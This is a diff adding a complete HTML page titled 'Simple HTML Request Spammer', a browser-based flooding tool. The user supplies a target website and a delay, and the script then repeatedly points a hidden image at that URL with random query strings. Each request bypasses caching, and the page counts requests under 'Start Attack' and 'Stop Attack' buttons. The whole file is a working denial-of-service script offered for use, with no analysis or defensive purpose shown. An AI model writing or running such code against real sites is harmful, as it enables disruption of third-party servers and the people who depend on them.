@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Simple HTML Request Spammer</title>
+</head>
+<body>
+<center>
+<img id="idsd" width="1" height="1">
+<span>Simple HTML Request Spammer</span>
+<input id="host" placeholder="Website (including protocol)">
+<p></p>
+<input id="delay" placeholder="Enter delay here (in ms)">
+<div id="captainspam"><button onclick="start()">Start Attack</button></div>
+<span id="msg"></span>
+</center>
+<script>
+var delay;
+var host;
+var spammer;
+var requests = 0;
+var randomIterator = 0;
+
+var emptymsg = '<span style="color:black">#</span>';
+
+function start() {
+delay = document.getElementById("delay").value;
+host = document.getElementById("host").value;
+if (delay == 0) {
+document.getElementById("msg").innerHTML = "No delay specified.";
+} else if (host == 0) {
+document.getElementById("msg").innerHTML = "No host specified.";
+} else {
+spammer = setInterval(serve, delay);
+document.getElementById("captainspam").innerHTML = '<button onclick="stop()">Stop Attack</button>';
+}
+}
+
+function stop() {
+document.getElementById("msg").innerHTML = "Attack stopped! " + requests + " requests sent to host " + host + "";
+clearInterval(spammer);
+requests = 0;
+document.getElementById("captainspam").innerHTML = '<button onclick="start()">Start Attack</button>';
+}
+
+function serve() {
+requests += 1;
+randomIterator = Math.floor(Math.random() * 899999999) + 100000000;
+var sourcer = host + "?x=" + randomIterator;
+document.getElementById("idsd").src = sourcer;
+document.getElementById("msg").innerHTML = "Attack on host " + host + " with delay " + delay + " (Requests sent: " + requests + ")";
+console.log(sourcer);
+}
+</script>
+</body>
+</html>
